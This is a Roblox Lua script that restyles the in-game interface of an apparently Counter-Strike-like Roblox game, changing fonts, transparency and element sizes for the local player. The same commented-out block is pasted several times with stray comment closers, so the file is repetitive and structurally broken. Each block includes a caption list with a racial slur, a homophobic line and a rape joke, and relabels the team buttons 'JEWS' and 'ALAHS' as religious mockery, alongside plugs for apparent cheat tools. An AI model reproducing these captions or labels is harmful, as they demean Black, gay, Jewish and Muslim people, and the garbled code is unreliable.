	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

